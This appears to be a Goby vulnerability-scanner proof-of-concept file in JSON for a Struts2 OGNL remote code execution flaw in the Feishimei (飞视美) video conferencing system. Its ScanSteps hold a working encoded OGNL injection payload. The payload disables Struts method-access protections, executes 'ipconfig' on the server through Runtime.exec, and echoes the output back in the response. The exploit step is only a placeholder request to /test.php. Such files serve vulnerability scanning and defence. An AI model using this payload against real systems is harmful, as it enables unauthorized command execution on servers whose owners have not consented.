{
      "Name": "feishimei struts2 remote code",
      "Level": "3",
      "Tags": [
            "rce"
      ],
      "GobyQuery": "title=\"飞视美视频会议系统\"",
      "Description": "",
      "Product": "",
      "Homepage": "https://gobies.org/",
      "Author": "gobysec@gmail.com",
      "Impact": "",
      "Recommendation": "",
      "References": [
            "https://gobies.org/"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/confinfoaction!showallConfinfos.action",
                        "follow_redirect": true,
                        "header": {
                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'ipconfig\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "IP",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "2022-07-07 22:39:00",
      "GobyVersion": "1.9.323"
}